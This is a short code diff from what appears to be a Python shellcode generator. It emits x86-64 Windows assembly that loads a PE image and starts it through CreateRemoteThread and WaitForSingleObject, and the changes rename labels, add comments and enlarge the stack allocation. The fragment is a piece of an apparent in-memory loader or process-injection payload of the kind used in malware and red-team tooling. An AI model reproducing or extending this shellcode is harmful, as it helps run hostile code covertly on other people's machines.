@@ -1294,8 +1294,9 @@ _start:
     mov rdi, rax
 
 stackAlign:
-    sub rsp, 8
-    mov r15, rsp
+    sub rsp, 0x08  ; Align the stack
+    sub rsp, 0x300 ; Allocate space for local variables
+    mov r15, rsp   ; Create a fake stack pointer
         """
 
         shellcode += self.resolve_functions()
@@ -1320,7 +1321,7 @@ stackAlign:
 ;                           [in]  LPVOID                 lpParameter,        // [RSP+0x20] => NULL
 ;                           [in]  DWORD                  dwCreationFlags,    // [RSP+0x28] => 0x00
 ;                           [out] LPDWORD                lpThreadId);        // [RSP+0x30] => NULL
-execute_pe:
+call_CreateRemoteThread:
     xor r9, r9
     mov r8, [r15 + {self.storage_offsets['pNtHeader']}]
     add r8, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
@@ -1340,10 +1341,10 @@ execute_pe:
 
 ; RAX => WaitForSingleObject([in] HANDLE hHandle,         // RCX => hThread
 ;                            [in] DWORD  dwMilliseconds); // RDX => -1
-wait:
+call_WaitForSingleObject:
     mov rcx, rax
     xor rdx, rdx
-    dec dl
+    dec rdx
     mov rax, [r15 + {self.storage_offsets['WaitForSingleObject']}]
     call rax
     ret
